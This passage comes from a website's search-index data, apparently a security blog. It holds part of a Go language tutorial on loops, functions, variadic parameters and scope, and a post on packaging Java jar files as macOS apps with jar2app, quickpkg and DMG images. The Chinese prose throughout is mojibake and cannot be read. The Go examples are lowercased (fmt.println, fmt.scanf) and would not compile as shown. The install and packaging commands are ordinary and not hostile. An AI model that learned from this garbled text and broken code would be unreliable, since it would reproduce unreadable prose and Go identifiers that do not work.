¶ä»è¯­è¨ä¸ä¸æ ·ï¼è¿éçcaseä¸è½å¤å±çç»§æ¿ï¼å¨å¶ä»è¯­è¨ä¸­ï¼ä½¿ç¨breakè¡¨ç¤ºç»æå½åcaseï¼èå¨goè¯­è¨ä¸­ï¼caseé»è®¤å°±åªæä¸å±ã\n\nç¬¬äºç§ç¨æ³æ¯å¨caseåé¢è·ä¸å¤æ­è¡¨è¾¾å¼ï¼\n\nvar score float64\nfmt.scanf("%f", &score)\nswitch {\n  case score >= 90:\n  fmt.println("ä¼ç§")\n  case score >= 80:\n  fmt.println("è¯å¥½")\n  case score >= 60:\n  fmt.println("åæ ¼")\n  default:\n  fmt.println("åæ¥åå")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å¾ªç¯\n\nå¾ªç¯ç»æé¡¾åæä¹å°±æ¯éå¤çå®ææä¸ä¸ªä»»å¡ï¼å¨å¶ä»è¯­è¨ä¸­å¯è½æwhileãdo-whileãforç­å¤ç§å¾ªç¯çæ ¼å¼ï¼ä½æ¯å¨goè¯­è¨ä¸­ï¼å°±åªæforå¾ªç¯ä¸ç§ã\n\nforå¾ªç¯çè¯­æ³æ ¼å¼å¦ä¸ï¼\n\nfor è¡¨è¾¾å¼1;è¡¨è¾¾å¼2;è¡¨è¾¾å¼3{\n\tå¾ªç¯ä½\n}\nè¡¨è¾¾å¼1:å®ä¹ä¸ä¸ªå¾ªç¯çåéï¼è®°å½å¾ªç¯çæ¬¡æ°\nè¡¨è¾¾å¼2ï¼ä¸è¬ä¸ºå¾ªç¯æ¡ä»¶ï¼å¾ªç¯å¤å°æ¬¡\nè¡¨è¾¾å¼3ï¼ä¸è¬ä¸ºæ¹åå¾ªç¯æ¡ä»¶çä»£ç ï¼ä½¿å¾ªç¯æ¡ä»¶ç»æä¸å¤©ä¸åæç«\nå¾ªç¯ä½ï¼éå¤è¦åçäºæã\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä»¥ä¸ä»£ç çæ§è¡é¡ºåºæ¯ï¼\n\nç¶åæ§è¡è¡¨è¾¾å¼2ï¼å¤æ­å¾ªç¯æ¡ä»¶æ¯å¦æç«ï¼å¦æè¡¨è¾¾å¼2è¿åçç»æä¸ºtrueï¼\n\nåæ§è¡å¾ªç¯ä½ãå½æ§è¡å®å¾ªç¯ä½åï¼æ§è¡è¡¨è¾¾å¼3ï¼ç¶åæ§è¡è¡¨è¾¾å¼2ï¼è¿æ¶ä¸ä¼å¨æ§è¡è¡¨è¾¾å¼1ï¼ç»§ç»­å¤æ­å¾ªç¯æ¡ä»¶æ¯å¦æç«ï¼\n\nå¦ææç«åç»§ç»­æ§è¡å¾ªç¯ä½ï¼å¦æä¸æç«ï¼åè·³åºforå¾ªç¯ã\n\nä¸¾ä¾å­ï¼è¾åºåæ¬¡hello world\n\nfor i := 0; i < 10; i++ {\n  fmt.println("helloworld")\n}\n\n\n1\n2\n3\n\n\næ­»å¾ªç¯ï¼\n\nfor {\n  fmt.println("helloworld")\n}\n\n\n1\n2\n3\n\n\n\n# è·³è½¬è¯­å¥\n\ncè¯­è¨ä¸­çè·³è½¬è¯­å¥å¸¸å¸¸è®©äººè¯çï¼å ä¸ºå¤ªè¿çµæ´»å¯¼è´ä»£ç å¯è¯»æ§è¾å·®ãgoè¯­è¨ä¸­ä¹æè·³è½¬è¯­å¥ï¼éå¸¸éåbreakãcontinueä½¿ç¨ã\n\n# break\n\nåé¢æä»¬åäºä¸ä¸ªæ­»å¾ªç¯ï¼å¦ææ³å¨å¾ªç¯éé¢ç»æè¿ä¸ªå¾ªç¯ï¼åéè¦ç¨å°breakãå¦ä¸æç¤ºï¼\n\nvar i int = 0\n\nfor {\n  i += 20\n  fmt.println(i)\n  if i%3 == 0 {\n    fmt.println(i)\n    break\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nbreakçä½ç¨æ¯è·³åºå¾ªç¯ãècontinueçä½ç¨æ¯è·³åºå½åå¾ªç¯ï¼è¿è¡ä¸ä¸æ¬¡å¾ªç¯ãå¦ä¸æç¤ºï¼\n\nvar i int = 0\nfor {\n  i += 20\n  fmt.println("i = ", i)\n  if i%3 == 0 {\n    fmt.println("i % 3== 0")\n    continue\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# å¾ªç¯åµå¥\n\nç´æ¥æå°ä¸ä¸ªä¹ä¹ä¹æ³è¡¨ï¼\n\nfor i := 1; i <= 9; i++ {\n  for j := 1; j <= i; j++ {\n    fmt.printf("%d*%d=%d\\t", j, i, i*j)\n  }\n  fmt.println()\n}\n\n//1*1=1   \n//1*2=2   2*2=4   \n//1*3=3   2*3=6   3*3=9   \n//1*4=4   2*4=8   3*4=12  4*4=16  \n//1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  \n//1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  \n//1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  \n//1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64  \n//1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# å½æ°\n\nå½æ°å°±æ¯å°ä¸å ä»£ç è¿è¡éç¨çä¸ç§æºå¶ãå½æ°å°±æ¯ä¸æ®µä»£ç ï¼ä¸ä¸ªå½æ°å°±åä¸ä¸ªä¸é¨åè¿ä»¶äºçäººï¼æä»¬è°ç¨å®æ¥åä¸äºäºæï¼å®å¯è½éè¦æä»¬æä¾ä¸äºæ°æ®ç»å®ï¼å®æ§è¡å®æåå¯è½ä¼æä¸äºæ§è¡ç»æç»æä»¬ãè¦æ±çæ°æ®å°±å«åæ°ï¼è¿åçæ§è¡ç»æå°±æ¯è¿åå¼ã\n\n\n# åæ°åè¡¨\n\n# æ®éåæ°åè¡¨\n\næ®éåæ°åè¡¨çåæ°æ°éæ¯ç¡®å®çã\n\nfunc test(a int, b int) {\n\tfmt.println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n\n\nå¯¹äºå¤ä¸ªåç±»åçåæ°å¯ä»¥ç®åï¼\n\n// è¿æ ·åä¸æ¸æ°\nfunc test(a,b int, str string ,f1,f2 float64) {\n\tfmt.println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n4\n\n\n# ä¸å®åæ°\n\nä¸å®åæ°æ¯æå¨ä¼ éåæ°æ¶ï¼åæ°çä¸ªæ°æ æ³ç¡®å®ãæä»¬å¯ä»¥ä½¿ç¨â¦çæ¹å¼ä»£è¡¨è¿éæå¤ä¸ªåæ°ãæ¥æ¶å°çåæ°ä»¥æ°ç»çå½¢å¼å­å¨ãå¦ä¸æç¤ºï¼\n\nfunc test(args ...int) {\n  for i := 0; i < len(args); i++ {\n    fmt.printf("args[%d]=%d\\n", i, args[i])\n  }\n}\n\nfunc main() {\n  test(1, 2, 3, 4, 5, 1, 1, 1, 1)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä½¿ç¨rangeéåä¸å®åæ°ï¼è¿éä½¿ç¨äºå¤éèµå¼çæ¹å¼ã\n\nfor i, arg := range args {\n  fmt.println(i, arg)\n}\n\n\n1\n2\n3\n\n\nå¦æå¨éåè¿ç¨ä¸­ä¸éè¦ç´¢å¼ï¼ä½æ¯å¨goè¯­è¨ä¸­å£°æçåéå¿é¡»ä½¿ç¨ï¼å æ­¤æä»¬å°±å¯ä»¥ä½¿ç¨å¿ååéå»æ¥åç´¢å¼å¼ã\n\nfunc test(a int, args ...float64) {\n\tfor _, data := range args {\n\t\tfmt.println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n\n\néè¦æ³¨æçæ¯ï¼å¨ä½¿ç¨äº ä¸å®åæ°ä¹åï¼å¦æéè¦æ·»å ä¸ä¸ªæå®åç§°çåæ°ï¼åå¿é¡»æ¾å°ä¸å®åæ°ä¹åï¼ä¹å°±æ¯è¯´ï¼ä¸å®åæ°åªè½æ¾å°åæ°åè¡¨çæåé¢ã\n\n// a åªè½æ¾å¨ç¬¬ä¸ä¸ªä½ç½®\nfunc test(a int , args ... float64)  {\n\tfmt.println(a,args[0])\n}\n\n\n1\n2\n3\n4\n\n\n\n# å½æ°çåµå¥è°ç¨\n\nåifè¯­å¥å¯ä»¥åµå¥ä¸æ ·ï¼å½æ°ä¹å¯ä»¥åµå¥è°ç¨ï¼æ¯å¦è¯´æä»¬å¨mainå½æ°ä¸­è°ç¨äºæå°å½æ°ï¼å®éä¸ä¹æ¯åµå¥è°ç¨çä¸ç§ãè¿å®éä¸éå¸¸å¥½çè§£åç¼åä»£ç ï¼ä½æ¯éè¦æ³¨æçæ¯ï¼å¨åµå¥è°ç¨å½æ°çæ¶åï¼å½ä¼ éä¸å®åæ°æ¶ï¼éè¦ä½¿ç¨å¦ä¸çåæ³ï¼\n\nfunc test1(args ...int)  {\n\ttest2(args...)\n}\n\nfunc test2(args ...int)  {\n\tfor _,data:=range args{\n\t\tfmt.println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¦ææä»¬åªæ³ä¼ éä¸é¨ååæ°ï¼èä¸æ¯å¨é¨ï¼åå¯ä»¥ä½¿ç¨åççæ¹å¼ï¼è¿å¾pythonï¼\n\nfunc test1(args ...int) {\n\ttest2(args[:2]...)\n}\n\nfunc test2(args ...int) {\n\tfor _, data := range args {\n\t\tfmt.println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå·ä½åççç¨æ³ï¼ä¼å¨åé¢æå°ã\n\n\n# å½æ°è¿åå¼\n\n# åä¸ªè¿åå¼\n\nå½æ°è¿åå¼é¡¾åæä¹å°±æ¯æ§è¡å®æå½æ°ä¹åéè¦è¿åç»è°ç¨çå¼ï¼åå¶ä»è¯­è¨ä¸­ä¸ågoè¯­è¨å¯ä»¥è¿åå¤ä¸ªè¿åå¼ãè¿åå¼çå®ä¹è¯­æ³å¦ä¸ï¼\n\nç¬¬ä¸ç§åæ³ï¼\n\nfunc test(args ...int) int {\n\tfmt.println("helloworld")\n\treturn 123\n}\n\n\n1\n2\n3\n4\n\n\nç¬¬äºç§åæ³ï¼\n\n// è¿ç§åæ³æ¯åå£°æäºä¸ä¸ªåé\nfunc test(args ...int) (returnvalue int) {\n\tfmt.println("helloworld")\n\treturnvalue = 123\n\treturn returnvalue\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¬¬ä¸ç§åæ³ï¼\n\n// å ä¸ºç¬¬äºç§åæ³å®ä¹äºä¸ä¸ªåé goå·²ç»ç¥éè¦è¿åçå¼æ¯ä»ä¹äºï¼å æ­¤å¯ä»¥çç¥ã\nfunc test(args ...int) (returnvalue int) {\n\tfmt.println("helloworld")\n\treturnvalue = 123\n\treturn \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¯¹äºä¸é¢çä¾å­ï¼å¯ä»¥ä½¿ç¨ä¸é¢çæ¹å¼æ¥åè¿åå¼ï¼\n\nfunc sum(args ...int) (sum int) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\treturn\n\n}\n\nfunc main() {\n\tresult := sum(1, 2, 3, 4)\n\tfmt.println("result=", result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¤è¿åå¼\n\nå¤è¿åå¼å®éä¸ååä¸ªè¿åå¼ç±»ä¼¼ï¼åªæ¯æ¥åçæ¶åä½¿ç¨å¤ä¸ªåéï¼å®ä¹çæ¶åå®ä¹å¤ä¸ªè¿åå¼å³å¯ã\n\n\n/*\n\tè®¡ç®ä¼ å¥æ°æ®çæ»å å¹³åæ°\n*/\nfunc calc(args ...int) (sum int, div float64) {\n\tfor _, data := range args {\n\t\tsum += data\n\t}\n\tdiv = float64(sum) / float64(len(args))\n\t//div = float64(sum / len(args))\n\treturn\n\n}\n\nfunc main() {\n\tsum, div := calc(1, 2, 3, 4)\n\tfmt.println("sum=", sum, ",div=", div)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# å½æ°ç±»å\n\ngoè¯­è¨ä¸­è¿æå¦ä¸ç§å®ä¹åä½¿ç¨å½æ°çæ¹å¼å°±æ¯ä½¿ç¨å½æ°ç±»åï¼å½æ°ç±»åå°±æ¯å°å½æ°ä½ä¸ºä¸ç§ç±»åæ¥å®ä¹åéï¼å®ä¹çæ¹å¼å¦ä¸æç¤ºï¼\n\nfunc sum(a int, b int) int {\n\treturn a + b\n}\n\ntype myfunc func(a, b int) (sum int)\n\nfunc main() {\n\tvar fun myfunc\n\tfun = sum\n\tresult := fun(1, 2)\n\tfmt.println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåè®°ä½è¿ç§è¯­æ³ï¼å¨é¢åå¯¹è±¡ä¹åå°±è½ä½ä¼å°è¿ç§è¯­æ³çå¥å¦ä¹å¤ã\n\n\n# ä½ç¨å\n\n# å±é¨åé\n\nå±é¨åéæ¯æå¨ä¸ä¸ªå¤§æ¬å·åå®ä¹çåéï¼è¯¥åéçä½ç¨åå°±å¨è¿ä¸ªå¤§æ¬å·ä¹åãå¦ä¸æç¤ºï¼aæ¯ä¸ä¸ªå±é¨åéï¼åªå¨teståé¨ææï¼å½æ§è¡å®testä¹åï¼aå°±éæ¯äºã\n\nfunc test() {\n\ta := 1\n\tb := 20\n\tfmt.println(a, b) //1 20\n}\nfunc main() {\n\ta := 20\n\ttest()\n\tfmt.println(a) //20\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# å¨å±åé\n\nå¨å±åéæ¯å®ä¹å¨å¨å±çåéï¼ä¹å°±æ¯å®ä¹å¨å½æ°ä¹å¤çåéï¼å¯ä»¥è¢«å¨å±çä½¿ç¨ãå¦ä¸æç¤ºï¼\n\nvar i int = 200\n\nfunc test() {\n\ti = 100\n\tfmt.println("i=", i) // 100\n}\n\nfunc main() {\n\ttest()\n\tfmt.println(i) //100\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ»ç»ï¼\n\n * å¨å½æ°å¤è¾¹å®ä¹çåéå«åå¨å±åéã\n * å¨å±åéè½å¤å¨ææçå½æ°ä¸­è¿è¡è®¿é®\n * å¦æå¨å±åéçåå­åå±é¨åéçåå­ç¸åï¼é£ä¹ä½¿ç¨çæ¯å±é¨åéçï¼å°æå·§å¼ºé¾ä¸åå°å¤´è\n\n\n# å¿åå½æ°\n\næä»¬å¨åé¢å®ä¹å½æ°çæ¶åï¼é½éè¦ç»å½æ°ä¸ä¸ªåå­ï¼å®éä¸æä»¬å¯ä»¥ä¸ç¨ç»å½æ°åå­ãå¦ä¸æç¤ºï¼\n\nfunc main() {\n\tf := func() {\n\t\tfmt.println("helloworld")\n\t}\n\tf()\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nå®éä¸æä»¬å¨è°ç¨å¿åå½æ°æ¶å¾å¾ä½¿ç¨å¦ä¸çæ¹å¼ï¼\n\nfunc main() {\n\tfunc(a, b int) {\n\t\tfmt.println("a+b=", a+b)\n\t}(1, 2)\n}\n\n\n1\n2\n3\n4\n5\n\n\nå½å¿åå½æ°æè¿åå¼æ¶ï¼ä¹å¯ä»¥æ¥åè¿åå¼ã\n\nfunc main() {\n\tx, y := func(a, b int) (sum, div float64) {\n\t\tsum = float64(a + b)\n\t\tdiv = sum / 2.0\n\t\treturn\n\t}(1, 2)\n\n\tfmt.println(x, y)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éå½å½æ°\n\néå½å½æ°å®éä¸ç®ä¸äºæ¯ä¸ç§å½æ°çç±»åï¼èæ´å¤çæ¯ä¸ç§ç®æ³ç»æï¼éå½å½æ°çæ¬è´¨å°±æ¯å½æ°èªå·±è°ç¨èªå·±ãå¦ä¸çä¾å­è®¡ç®nçé¶ä¹ï¼\n\nfunc test(n int) (result int) {\n\tif n == 1 {\n\t\treturn 1\n\t}\n\tresult = test(n-1) * n\n\treturn\n}\n\nfunc main() {\n\tresult := test(4)\n\tfmt.println(result)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä½æ¯è¿ç§æ¹å¼è½ç¶åèµ·æ¥æ¯è¾ç®ä¾¿ï¼ä½æ¯æçå¹¶ä¸é«ãå¤æ¬¡åµå¥è°ç¨ä¼å ç¨å¤§éçç³»ç»èµæºã\n\n\n# å·¥ç¨\n\n\n# æ°æ®æ ¼å¼\n\n\n# æ°ç»\n\n\n# åç\n\n\n# å­ç¬¦ä¸²\n\n\n# å­å¸map\n\n\n# ç»æä½struct\n\n\n# æé\n\n\n# é¢åå¯¹è±¡\n\n\n# å¼å¸¸\n\n\n# ææ¬å¤ç',charsets:{cjk:!0},lastUpdated:"2022/04/07, 16:17:07",lastUpdatedTimestamp:1649348227e3},{title:"Jaræåä¸ºAPP",frontmatter:{title:"Jaræåä¸ºAPP",date:"2022-04-20T21:00:00.000Z",permalink:"/sec/skill/jar2app",author:{name:"NineRiverSec",link:"https://github.com/NineRiverSec"},categories:["å¥æ·«å·§æ","å°å·¥å·"],tags:["Tools"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/203.%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80/2030.%E5%B0%8F%E5%B7%A5%E5%85%B7/00.jar%E6%89%93%E5%8C%85%E4%B8%BAapp.html",relativePath:"02.å®å¨/203.å¥æ·«å·§æ/2030.å°å·¥å·/00.jaræåä¸ºapp.md",key:"v-4077a5fe",path:"/sec/skill/jar2app/",headers:[{level:2,title:"ææºç ",slug:"ææºç ",normalizedTitle:"ææºç ",charIndex:245},{level:2,title:"ææºç ",slug:"ææºç -2",normalizedTitle:"ææºç ",charIndex:245},{level:2,title:"å°è£DMG",slug:"å°è£dmg",normalizedTitle:"å°è£dmg",charIndex:2257},{level:2,title:"åæ",slug:"åæ",normalizedTitle:"åæ",charIndex:3009}],excerpt:'<h1 id="jaræåapp"><a class="header-anchor" href="#jaræåapp">#</a> JaræåAPP</h1>\n<blockquote>\n<p>å¨ Mac ä¸è¿è¡ jar æä»¶ï¼ä¾å¦ Burp\\å¥æ¯æ\\å°èç­ï¼æ¯æ¬¡é½éè¦<code>java -jar xxxx.jar</code> (å½ç¶ç¹å®çç¨åºå¯è½è¿éè¦æ·»å ä¸äºjavaçåæ°)ï¼æè§å¤ªç¹çäºãå æ­¤ï¼æ³æåæ app æ¹ä¾¿ä½¿ç¨ãæåæåææå¾ï¼è¿éç»å¤§å®¶æä¾æååºæ¥ç appã</p>\n<p>å¯ä»¥ç´æ¥ä»GitHubè·åï¼https://github.com/NineRiverSec/Mac_Tools åä½å¸åç¹ä¸ªææå§ï¼</p>\n</blockquote>\n',headersStr:"ææºç  ææºç  å°è£DMG åæ",content:'# JaræåAPP\n\n> å¨ Mac ä¸è¿è¡ jar æä»¶ï¼ä¾å¦ Burp\\å¥æ¯æ\\å°èç­ï¼æ¯æ¬¡é½éè¦java -jar xxxx.jar (å½ç¶ç¹å®çç¨åºå¯è½è¿éè¦æ·»å ä¸äºjavaçåæ°)ï¼æè§å¤ªç¹çäºãå æ­¤ï¼æ³æåæ app æ¹ä¾¿ä½¿ç¨ãæåæåææå¾ï¼è¿éç»å¤§å®¶æä¾æååºæ¥ç appã\n> \n> å¯ä»¥ç´æ¥ä»GitHubè·åï¼https://github.com/NineRiverSec/Mac_Tools åä½å¸åç¹ä¸ªææå§ï¼\n\né£ä¹è½¬osX ç®åæ¥è¯´ä¸å±æ¯åä¸ºä¸¤ç§ ï¼\n\n * ææºç ï¼æåçåºç¨è¾å¤§å ä¸ºæºå¸¦JDKï¼\n\n * æ æºç ï¼åªæJARåï¼å¯èªå·±éæ©æ¯å¦æºå¸¦JDKï¼\n\n\n# ææºç \n\néä¾¿git clone ä¸ä¸ªæGUIçJAVAæºç ï¼ç¶åæå¼æè²ä¼æ çIDEA æç§å¦ä¸æå¼åè¿è¡è®¾ç½®\n\n\n\nç¶åè¿è¡æå»ºå·¥ä»¶\n\n\n\nä¼å¨å½åç®å½ä¸çæä¸ä¸ªæ°çæä»¶å¤¹ ä¸º out/xxx(appçåå­)/bundles/å°±ä¼åºç° è¿ä¸ªè½¯ä»¶çAPPäº\n\næ³¨ææ­¤æ¹æ³ä¼æåjdkç¯å¢å°appéé¢ä½ç§¯è¾å¤§ï¼ï¼ï¼\n\n\n# ææºç \n\nå®è£jar2app\n\n#è·å\ngit clone https://github.com/Jorl17/jar2app\ncd jar2app\nchmod +x install.sh uninstall.sh\n#å®è£ä¸ºå¨å±å½ä»¤\nsudo ./install.sh /usr/local/bin\n#å¸è½½å½ä»¤\n./uninstall.sh /usr/local/bin\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä½¿ç¨æ¹å¼\n\n#å¯¼åºå°æä»¶å¤¹\njar2app test.jar out\n#å¯¼åºapp\njar2app test.jar out.App\njar2app test.jar test/out.App\n#è®¾ç½®icon\njar2app test.jar -i icon.icns\njar2app test.jar -i /awesomeicons/icon.icns\n#è®¾ç½®åç§°\njar2app test.jar -n "Amazing Application" out.app\n#ç»å®jre\njar2app test.jar -r /Library/Java/JavaVirtualMachines/jdk1.8.0_40.jdk\njar2app test.jar -r /compressedJDKs/jdk1.8.0_40.jdk.zip   \n#å®æ´è®¾ç½®\njar2app test.jar -n "Amazing Application" out.app -i /awesomeicons/icon.icns \njar2app test.jar -n "Amazing Application" out.app -i /awesomeicons/icon.icns -r /compressedJDKs/jdk1.8.0_40.jdk.zip  \n#å¸¦jdrãè½æ¬¾,è®¾ç½®èåå,è¿è¡æå\njar2app df_home.jar -n "df_home" app/df_home.app -i /Users/df/Pictures/logo/df_logo/Untitled.icns -c "Copyright Â© 2020 df Inc." -r /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk\njar2app /Users/df/Documents/åå¸/df_home.jar  -n "df_home" /Users/df/Documents/åå¸/app/df_home.app -i /Users/df/Pictures/logo/df_logo/Untitled.icns -c "Copyright Â© 2020 df Inc."\n#å¸¦è½æ¬¾,è®¾ç½®èåå,è¿è¡æå\njar2app df_home.jar -n "df_home" app/df_home_0.app -i /Users/df/Pictures/logo/df_logo/Untitled.icns -c "Copyright Â© 2020 df Inc."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¯¹åºåæ°è§£é\n\n-n : å°±æ¯ç¨åºè¿è¡æ¶ï¼å¨èåæ ä¸çåç§°\n\n-i : è½¬æ¢æappä¹åï¼åºç¨çlogoï¼å¾çæ ¼å¼è¦ä½¿ç¨.icns åç¼ï¼è¿éæä¾ä¸ä¸pngè½¬.icnsçurlï¼https://iconverticons.com/online/\n\n-b : å¯æå¯æ çä¸è¥¿ï¼è¿ä¸ªæ¯ççå¯æå¯æ ï¼å°±æ¯ä¸è½¯ä»¶åºç¡ä¿¡æ¯\n\n-v : å¯æå¯æ çä¸è¥¿ï¼è¿ä¸ªæ¯ççå¯æå¯æ ï¼å°±æ¯ä¸è½¯ä»¶åºç¡ä¿¡æ¯\n\n-s : å¯æå¯æ çä¸è¥¿ï¼è¿ä¸ªæ¯ççå¯æå¯æ ï¼å°±æ¯ä¸è½¯ä»¶åºç¡ä¿¡æ¯\n\n-m : è¿ä¸ªå¯ä»¥æï¼æäºå®è½¯ä»¶å¯å¨è½å¿«ä¸ç§ï¼æ²¡äºå®ï¼appåºç¨å¾å»jaréé¢æ¾mainå¥å£å½æ°ï¼æä»¥ï¼è¿ä¸ªå¯ä»¥æï¼é¿çä¸èæ¶é´å¤çå¿½ç¥è¿ä¸ªåæ°ãè³äºmainå¥å£å¨åªéçï¼ç¨åç¼©åæ¹å¼æå¼jaræä»¶ï¼éé¢æ¾å°META-INFæä»¶ä¸çæä»¶æå¼ççå°±å¥½ï¼å¯ä»¥çå°mainä¸»å½æ°å¥å£ä¿¡æ¯çã\n\n-o : å°±æ¯è®©è¿ä¸ªç¨åºæ§è¡çæ¶åï¼å¨æ é¢æ æä¸ªèåå¯ä»¥æ¾ç¤º\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# å°è£DMG\n\nquickpkgå¯ä»¥å¿«éæ¹ä¾¿çæappåºç¨æåæpkgå®è£åï¼å®è£quickpkgï¼\n\ngit clone https://github.com/scriptingosx/quickpkg.git\n\ncd quickpkg\n\n\n1\n2\n3\n\n\nappå°è£ä¸ºpkgï¼\n\n./quickpkg /Users/csjar/xxxx.app --output /Users/csjar/x x x x.pkg\n\n\n1\n\n\nä¸å --outputåæ°æå®è¾åºè·¯å¾ï¼é»è®¤ä¼å¨quickpkgç®å½ä¸çæã\n\nAPPæåædmgï¼\n\nï¼1ï¼æå¼ç£çå·¥å·ï¼éæ©æä»¶ -> æ°å»ºæ å -> ç©ºç½æ å\nï¼2ï¼å¡«åæ åç¸å³ä¿¡æ¯ï¼å¶ä¸­å¤§å°éè¦è®¾ç½®çæ¯appç¨åºå¤§ä¸äºã\nï¼3ï¼è¿å¥dmgæä»¶ï¼å¨æ­¤å¤æå¼å½ä»¤è¡ï¼åå»ºApplicationsé¾æ¥ã\nln -s /Applications/ Applications\nï¼4ï¼å³é®dmgæä»¶ï¼âæ¥çæ¾ç¤ºéé¡¹âä¸­è®¾ç½®èæ¯å¾çã\n\n\n1\n2\n3\n4\n5\n\n\nå¾ç\nè¿éé¢è¸©äºæ æ°ä¸ªåï¼ååå¤å¤å¥½é¿ä¸æ®µæ¶é´æè§£å³ã\nå·¥å·è®°å¾å¤è¯»æåï¼ä¾å¦å¨è¿éç¨ç jar2app ç´æ¥å¨ GitHub ä¸é¢å¤è¯»æåï¼åºæ¬é®é¢é½è½è§£å³ï¼\nå¾ç\nå¾ç\nå®ç°åæ ·åè½çä¸åå½æ°ï¼å¨ä½¿ç¨æ¶éè¦æç§éæ±è¿è¡ä½¿ç¨ãä¾å¦è¿éç File ().exists () ä¸ File.getAbsoluteFile ()ï¼ä¸åå½æ°åæ»æä¼ä¸ä¸æ ·çå°æ¹ï¼ç´æ¥å¹³æ¶åªæ¯ä¸ºäºå®ç°åè½èå¿½ç¥å¶æ¬è´¨ï¼ææ¶ååºç°é®é¢çæ¶åéè¦æ·±å¥äºè§£å¶æ¬è´¨ï¼\nWinç¨æ·å¯ä»¥æç´¢Jar2exe æ¥å¯¹exeè¿è¡å°åã\néå°åç§é®é¢å¯ä»¥æ·»å è¿è¥å¾®ä¿¡ è¿è¡æ²éè§£å³æçå¨GitHubä¸æIssuesã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# åæ\n\nhttps://mp.weixin.qq.com/s/X6fyn1vX1P52rUd9Pv_dvg\n\nç®åè®°å½ï¼æ¹ä¾¿åç»­ä½¿ç¨ï¼å¦æä¾µæï¼èç³»å é¤ã',normalizedContent:'# jaræåapp\n\n> å¨ mac ä¸è¿è¡ jar æä»¶ï¼ä¾å¦ burp\\å¥æ¯æ\\å°èç­ï¼æ¯æ¬¡é½éè¦java -jar xxxx.jar (å½ç¶ç¹å®çç¨åºå¯è½è¿éè¦æ·»å ä¸äºjavaçåæ°)ï¼æè§å¤ªç¹çäºãå æ­¤ï¼æ³æåæ app æ¹ä¾¿ä½¿ç¨ãæåæåææå¾ï¼è¿éç»å¤§å®¶æä¾æååºæ¥ç appã\n> \n> å¯ä»¥ç´æ¥ä»githubè·åï¼https://github.com/nineriversec/mac_tools åä½å¸åç¹ä¸ªææå§ï¼\n\né£ä¹è½¬osx ç®åæ¥è¯´ä¸å±æ¯åä¸ºä¸¤ç§ ï¼\n\n * ææºç ï¼æåçåºç¨è¾å¤§å ä¸ºæºå¸¦jdkï¼\n\n * æ æºç ï¼åªæjaråï¼å¯èªå·±éæ©æ¯å¦æºå¸¦jdkï¼\n\n\n# ææºç \n\néä¾¿git clone ä¸ä¸ªæguiçjavaæºç ï¼ç¶åæå¼æè²ä¼æ çidea æç§å¦ä¸æå¼åè¿è¡è®¾ç½®\n\n\n\nç¶åè¿è¡æå»ºå·¥ä»¶\n\n\n\nä¼å¨å½åç®å½ä¸çæä¸ä¸ªæ°çæä»¶å¤¹ ä¸º out/xxx(appçåå­)/bundles/å°±ä¼åºç° è¿ä¸ªè½¯ä»¶çappäº\n\næ³¨ææ­¤æ¹æ³ä¼æåjdkç¯å¢å°appéé¢ä½ç§¯è¾å¤§ï¼ï¼ï¼\n\n\n# ææºç \n\nå®è£jar2app\n\n#è·å\ngit clone https://github.com/jorl17/jar2app\ncd jar2app\nchmod +x install.sh uninstall.sh\n#å®è£ä¸ºå¨å±å½ä»¤\nsudo ./install.sh /usr/local/bin\n#å¸è½½å½ä»¤\n./uninstall.sh /usr/local/bin\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä½¿ç¨æ¹å¼\n\n#å¯¼åºå°æä»¶å¤¹\njar2app test.jar out\n#å¯¼åºapp\njar2app test.jar out.app\njar2app test.jar test/out.app\n#è®¾ç½®icon\njar2app test.jar -i icon.icns\njar2app test.jar -i /awesomeicons/icon.icns\n#è®¾ç½®åç§°\njar2app test.jar -n "amazing application" out.app\n#ç»å®jre\njar2app test.jar -r /library/java/javavirtualmachines/jdk1.8.0_40.jdk\njar2app test.jar -r /compressedjdks/jdk1.8.0_40.jdk.zip   